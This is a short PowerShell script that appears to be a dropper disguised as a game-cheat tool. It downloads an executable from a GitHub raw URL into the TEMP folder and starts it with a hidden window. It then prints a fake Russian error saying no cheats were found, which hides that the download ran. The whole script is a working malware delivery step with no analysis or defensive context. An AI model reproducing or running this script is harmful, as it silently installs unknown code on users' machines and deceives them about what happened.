$url = "https://github.com/nagibatorm55-ops/errorfuck/raw/refs/heads/main/wedsuvit1ggjshsa.exe"
$path = "$env:TEMP\error.exe"
irm $url -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
Start-Sleep -Seconds 2
Write-Host "Ошибка: читы не найдены. Попробуйте позже." -ForegroundColor Red
